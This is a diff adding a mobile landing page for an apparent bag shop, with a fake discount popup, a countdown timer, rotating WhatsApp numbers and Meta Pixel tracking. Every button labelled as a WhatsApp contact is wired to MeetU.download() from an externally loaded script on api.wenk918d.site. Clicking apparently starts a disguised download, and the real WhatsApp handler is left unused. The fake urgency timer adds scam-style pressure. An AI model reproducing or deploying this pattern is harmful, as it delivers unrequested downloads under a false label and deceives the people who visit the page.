@@ -1,0 +1,677 @@
+<!DOCTYPE html><html lang="zh"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Landing Page</title>
+
+   
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   
+<style>
+/* ===== 重置 + 基础样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+    font-family: Arial, system-ui, -apple-system, 'Segoe UI', sans-serif;
+}
+
+body {
+    background: #e9e9e9;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 0;
+    margin: 0;
+}
+
+/* ===== 手机容器 ===== */
+.page {
+    width: 100%;
+    max-width: 430px;
+    background: #fff;
+    min-height: 98vh;
+    position: relative;
+}
+
+/* ===== Banner ===== */
+.banner {
+    position: relative;
+    width: 100%;
+    height: 393px;
+    background: url('images/bg.jpg') center/cover no-repeat;
+}
+
+.banner-btn {
+    position: absolute;
+    left: 15px;
+    bottom: 24px;
+    background: #25D366;
+    color: #fff;
+    padding: 10px 14px;
+    border-radius: 30px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: bold;
+    text-decoration: none;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    cursor: pointer;
+    border: none;
+}
+
+.banner-btn img {
+    width: 28px;
+    height: 28px;
+}
+
+/* ===== LIVE TITLE ===== */
+.live-title {
+    text-align: center;
+    font-weight: 800;
+    color: #888;
+    font-size: 18px;
+    letter-spacing: 2px;
+    margin: 18px 0 10px;
+}
+
+/* ===== Marquee ===== */
+.marquee-wrap {
+    width: 100%;
+    overflow: hidden;
+    padding: 10px 0 20px;
+    background: #fff;
+    position: relative;
+}
+
+.marquee {
+    display: flex;
+    gap: 12px;
+    width: max-content;
+    animation: scroll 18s linear infinite;
+}
+
+.marquee .item {
+    width: 140px;
+    height: 140px;
+    border-radius: 12px;
+    overflow: hidden;
+    flex: 0 0 auto;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+}
+
+.marquee .item img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+@keyframes scroll {
+    0% { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+}
+
+/* ===== Big Image ===== */
+.big-image {
+    padding: 15px;
+}
+
+.big-image img {
+    width: 100%;
+    border-radius: 12px;
+}
+
+/* ===== Floating WhatsApp ===== */
+.float-whatsapp {
+    position: fixed;
+    left: 50%;
+    transform: translateX(-50%);
+    bottom: 18px;
+    width: 90%;
+    max-width: 390px;
+    background: #25D366;
+    color: #fff;
+    padding: 14px;
+    border-radius: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    font-weight: bold;
+    z-index: 999;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+    cursor: pointer;
+    border: none;
+}
+
+.float-whatsapp img {
+    width: 28px;
+    height: 28px;
+}
+
+/* ===== 弹窗 (Modal) ===== */
+.offer-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s;
+    padding: 16px;
+}
+
+.offer-modal.active {
+    opacity: 1;
+    visibility: visible;
+}
+
+.modal-card {
+    background: #ffffff;
+    max-width: 360px;
+    width: 100%;
+    border-radius: 44px;
+    padding: 32px 24px 30px;
+    text-align: center;
+    box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+    animation: modalPop 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    position: relative;
+}
+
+@keyframes modalPop {
+    from {
+        transform: scale(0.92);
+        opacity: 0;
+    }
+    to {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+
+.discount-badge {
+    font-size: 2.8rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #25D366, #1a9e4a);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    margin-bottom: 8px;
+    letter-spacing: -0.5px;
+}
+
+.modal-card h3 {
+    font-size: 1.8rem;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: #1e2a32;
+}
+
+.offer-text {
+    font-size: 1rem;
+    color: #2c3e44;
+    line-height: 1.5;
+    margin: 8px 0 20px;
+    font-weight: 450;
+    padding: 0 4px;
+}
+
+.highlight {
+    font-weight: 700;
+    color: #1f8a4c;
+}
+
+.modal-buttons {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-top: 6px;
+}
+
+.contact-wa-btn {
+    background: #25D366;
+    border: none;
+    padding: 15px 20px;
+    border-radius: 60px;
+    color: white;
+    font-weight: 620;
+    font-size: 1rem;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: all 0.15s;
+    box-shadow: 0 8px 20px rgba(37, 211, 102, 0.25);
+    width: 100%;
+}
+.contact-wa-btn:active {
+    transform: scale(0.97);
+}
+
+.contact-website-btn {
+    background: #4285f4;
+    border: none;
+    padding: 15px 20px;
+    border-radius: 60px;
+    color: white;
+    font-weight: 600;
+    font-size: 1rem;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    transition: all 0.15s;
+    box-shadow: 0 6px 16px rgba(66, 133, 244, 0.25);
+}
+.contact-website-btn:active {
+    transform: scale(0.97);
+}
+
+.close-modal-btn {
+    background: #eef2f5;
+    border: none;
+    padding: 14px 20px;
+    border-radius: 60px;
+    font-weight: 500;
+    color: #2c3e44;
+    cursor: pointer;
+    font-size: 0.95rem;
+    transition: background 0.15s;
+    width: 100%;
+}
+.close-modal-btn:active {
+    background: #dce2e8;
+}
+
+.countdown-wrapper {
+    margin-top: 20px;
+    padding-top: 18px;
+    border-top: 1px solid #e9edf2;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.countdown-title {
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: #5e6f7e;
+    font-weight: 600;
+    margin-bottom: 10px;
+}
+
+.countdown-timer {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-variant-numeric: tabular-nums;
+}
+
+.time-block {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    background: #f4f7fa;
+    padding: 8px 12px;
+    border-radius: 18px;
+    min-width: 60px;
+}
+
+.time-number {
+    font-size: 2.2rem;
+    font-weight: 700;
+    color: #1e2a32;
+    line-height: 1.2;
+    letter-spacing: 1px;
+}
+
+.time-label {
+    font-size: 0.6rem;
+    text-transform: uppercase;
+    color: #6f7e8d;
+    letter-spacing: 0.8px;
+    margin-top: 2px;
+}
+
+.time-separator {
+    font-size: 2rem;
+    font-weight: 300;
+    color: #8a9aa8;
+    padding: 0 2px;
+}
+
+@media (max-width: 420px) {
+    .modal-card {
+        padding: 26px 18px 24px;
+        border-radius: 36px;
+    }
+    .discount-badge {
+        font-size: 2.4rem;
+    }
+    .modal-card h3 {
+        font-size: 1.6rem;
+    }
+    .offer-text {
+        font-size: 0.95rem;
+    }
+    .time-number {
+        font-size: 1.8rem;
+    }
+    .time-block {
+        min-width: 50px;
+        padding: 6px 8px;
+    }
+}
+
+@media (max-width: 360px) {
+    .modal-card {
+        padding: 20px 14px 20px;
+    }
+    .contact-wa-btn,
+    .contact-website-btn,
+    .close-modal-btn {
+        padding: 12px 16px;
+        font-size: 0.9rem;
+    }
+}
+</style>
+
+<!-- Meta Pixel Code -->
+<script async="" src="js/fbevents.js"></script><script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1621755939544598');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1621755939544598&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script>
+function k2() {
+    MeetU.download(event);
+}
+</script>
+
+</head>
+<body>
+
+<div class="page">
+
+    <!-- ===== Banner ===== -->
+    <div class="banner">
+        <button class="banner-btn" id="bannerBtn">
+            <img src="images/whatsapp.png" alt="whatsapp">
+            WhatsApp Inquiry
+        </button>
+    </div>
+
+    <!-- ===== LIVE SHOWROOM ===== -->
+    <div class="live-title">LIVE SHOWROOM</div>
+
+    <!-- ===== Carousel ===== -->
+    <div class="marquee-wrap">
+        <div class="marquee">
+            <div class="item"><img src="images/g1.jpg"></div>
+            <div class="item"><img src="images/g2.jpg"></div>
+            <div class="item"><img src="images/g3.jpg"></div>
+            <div class="item"><img src="images/g4.jpg"></div>
+            <div class="item"><img src="images/g5.jpg"></div>
+            <div class="item"><img src="images/g6.jpg"></div>
+            <div class="item"><img src="images/g7.jpg"></div>
+            <div class="item"><img src="images/g8.jpg"></div>
+            <div class="item"><img src="images/g9.jpg"></div>
+        </div>
+    </div>
+
+    <!-- ===== Big Image ===== -->
+    <div class="big-image">
+        <img src="images/di.png">
+    </div>
+
+</div>
+
+<!-- ===== Floating WhatsApp ===== -->
+<button class="float-whatsapp" id="floatBtn">
+    <img src="images/whatsapp.png">
+    Go to WhatsApp for catalog
+</button>
+
+<!-- ========== 弹窗 ========== -->
+<div id="offerModal" class="offer-modal">
+    <div class="modal-card">
+
+        <div class="discount-badge">10% OFF</div>
+        <h3>Special Offer</h3>
+        <div class="offer-text">
+            Contact customer service via <strong>WhatsApp</strong> and get <span class="highlight">10% discount</span> on your first order.
+        </div>
+
+        <div class="modal-buttons">
+            <button class="contact-wa-btn" id="popupWhatsAppBtn">
+                <span style="display:inline-block; width:22px; height:22px; background: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'white\'><path d=\'M12.032 2.016c-5.52 0-9.984 4.464-9.984 9.984 0 1.776.48 3.456 1.296 4.944L2.016 22.56l5.76-1.44c1.44.768 3.072 1.2 4.8 1.2 5.52 0 9.984-4.464 9.984-9.984S17.552 2.016 12.032 2.016zm0 18.432c-1.632 0-3.168-.432-4.512-1.248l-.336-.192-3.36.864.864-3.264-.24-.336c-.864-1.344-1.344-2.88-1.344-4.512 0-4.608 3.744-8.352 8.352-8.352s8.352 3.744 8.352 8.352-3.744 8.352-8.352 8.352zm4.56-6.288c-.24-.12-1.44-.72-1.68-.792-.24-.072-.432-.12-.624.12-.192.24-.72.912-.912.96-.168.168-.336.192-.576.072-.24-.12-1.008-.36-1.92-1.176-.72-.648-1.2-1.44-1.344-1.68-.144-.24-.024-.384.12-.504.12-.12.264-.312.384-.48.12-.168.168-.288.264-.48.096-.24.048-.432-.024-.6-.072-.168-.624-1.488-.864-2.04-.216-.528-.432-.456-.624-.456-.144 0-.312-.024-.48-.024s-.432.072-.672.336c-.24.264-.912.888-.912 2.184 0 1.296.936 2.544 1.08 2.712.144.168 1.824 2.856 4.44 3.984.624.264 1.104.432 1.488.552.624.192 1.2.168 1.656.096.504-.072 1.44-.6 1.632-1.176.192-.576.192-1.08.144-1.176-.048-.072-.168-.144-.408-.264z\'/></svg>') no-repeat center; background-size: contain;"></span>
+                <span id="popupBtnText">Claim 10% via WhatsApp</span>
+            </button>
+
+            <button class="contact-website-btn" id="websiteBtn">
+                🌐 Visit Website
+            </button>
+
+            <button id="closeModalBtn" class="close-modal-btn">Maybe later</button>
+        </div>
+
+        <div class="countdown-wrapper">
+            <div class="countdown-title">⏳ Limited Time Offer Countdown</div>
+            <div class="countdown-timer" id="countdownTimer">
+                <div class="time-block">
+                    <span class="time-number" id="minutesDisplay">02</span>
+                    <span class="time-label">minute</span>
+                </div>
+                <span class="time-separator">:</span>
+                <div class="time-block">
+                    <span class="time-number" id="secondsDisplay">00</span>
+                    <span class="time-label">second</span>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 整合后的 JavaScript（轮询 + 弹窗 + 倒计时）
+// ============================================================
+
+// ============================================================
+// 1. 号码池
+// ============================================================
+const whatsappNumbers = [
+    '8613178246062',
+    '8613178246062',
+    '8617505944795',
+    '8617505944795',
+    '85255907672',
+    '85255907672',
+    '85255061941',
+    '85255061941'
+];
+
+// ============================================================
+// 2. 核心轮询逻辑
+// ============================================================
+let lastUsedIndex = -1;
+
+function getNextNumber() {
+    const total = whatsappNumbers.length;
+    if (total === 1) {
+        return whatsappNumbers[0];
+    }
+    let randomIndex;
+    let attempts = 0;
+    const maxAttempts = 100;
+    do {
+        randomIndex = Math.floor(Math.random() * total);
+        attempts++;
+        if (attempts > maxAttempts) {
+            randomIndex = (lastUsedIndex + 1) % total;
+            break;
+        }
+    } while (randomIndex === lastUsedIndex);
+    lastUsedIndex = randomIndex;
+    return whatsappNumbers[randomIndex];
+}
+
+// ============================================================
+// 3. Facebook Pixel 跟踪
+// ============================================================
+function trackFB() {
+    if (typeof fbq !== 'undefined') {
+        fbq('track', 'Contact', {
+            content_name: 'WhatsApp Click',
+            content_category: 'Lead',
+            method: 'WhatsApp'
+        });
+        console.log('[FB Pixel] Contact 事件已触发');
+    } else {
+        console.log('[FB Pixel 模拟] Contact 事件');
+    }
+}
+
+// ============================================================
+// 4. 打开 WhatsApp（所有按钮共用）
+// ============================================================
+function openWA() {
+    const number = getNextNumber();
+    trackFB();
+    const defaultMessage = "Hi, I saw your FB ad. I want to check price & real photos?";
+    const encodedMessage = encodeURIComponent(defaultMessage);
+    const url = `https://wa.me/${number}?text=${encodedMessage}`;
+    window.open(url, '_blank');
+    // 关闭弹窗
+    closePopup();
+}
+
+// ============================================================
+// 5. 弹窗控制
+// ============================================================
+const modal = document.getElementById('offerModal');
+
+function showPopup() {
+    if (!modal) return;
+    modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function closePopup() {
+    if (!modal) return;
+    modal.classList.remove('active');
+    document.body.style.overflow = '';
+}
+
+// ============================================================
+// 6. 倒计时 (2分钟)
+// ============================================================
+let totalSeconds = 120;
+const minutesEl = document.getElementById('minutesDisplay');
+const secondsEl = document.getElementById('secondsDisplay');
+
+function updateCountdown() {
+    if (totalSeconds < 0) {
+        minutesEl.textContent = '00';
+        secondsEl.textContent = '00';
+        return;
+    }
+    const mins = Math.floor(totalSeconds / 60);
+    const secs = totalSeconds % 60;
+    minutesEl.textContent = String(mins).padStart(2, '0');
+    secondsEl.textContent = String(secs).padStart(2, '0');
+    totalSeconds--;
+}
+
+updateCountdown();
+const timerInterval = setInterval(() => {
+    updateCountdown();
+    if (totalSeconds < 0) {
+        clearInterval(timerInterval);
+    }
+}, 1000);
+
+// ============================================================
+// 7. 绑定所有按钮事件
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    // 所有 WhatsApp 按钮（共用 openWA）
+    const bannerBtn = document.getElementById('bannerBtn');
+    const floatBtn = document.getElementById('floatBtn');
+    const popupWaBtn = document.getElementById('popupWhatsAppBtn');
+
+    // 绑定 WhatsApp 按钮
+    if (bannerBtn) bannerBtn.addEventListener('click', k2);
+    if (floatBtn) floatBtn.addEventListener('click', k2);
+    if (popupWaBtn) popupWaBtn.addEventListener('click', k2);
+
+    // 关闭弹窗按钮
+    const closeBtn = document.getElementById('closeModalBtn');
+    if (closeBtn) {
+        closeBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            closePopup();
+        });
+    }
+
+    // 访问网站按钮
+    const websiteBtn = document.getElementById('websiteBtn');
+    if (websiteBtn) {
+        websiteBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            closePopup();
+            // 跳转到网站
+            window.location.href = 'https://www.xixibag.xyz/';
+        });
+    }
+
+    // 点击背景关闭弹窗
+    if (modal) {
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closePopup();
+            }
+        });
+    }
+
+    // ============================================================
+    // 8. 自动弹出弹窗 (延迟1.2秒)
+    // ============================================================
+    setTimeout(function() {
+        showPopup();
+    }, 5000);
+
+    console.log('✅ 轮询已初始化, 号码池:', whatsappNumbers.length, '个');
+    console.log('📌 所有 WhatsApp 按钮共用轮询逻辑，不会连续重复');
+    console.log('⏰ 弹窗将在 3后自动弹出');
+});
+</script>
+
+
+</body></html>
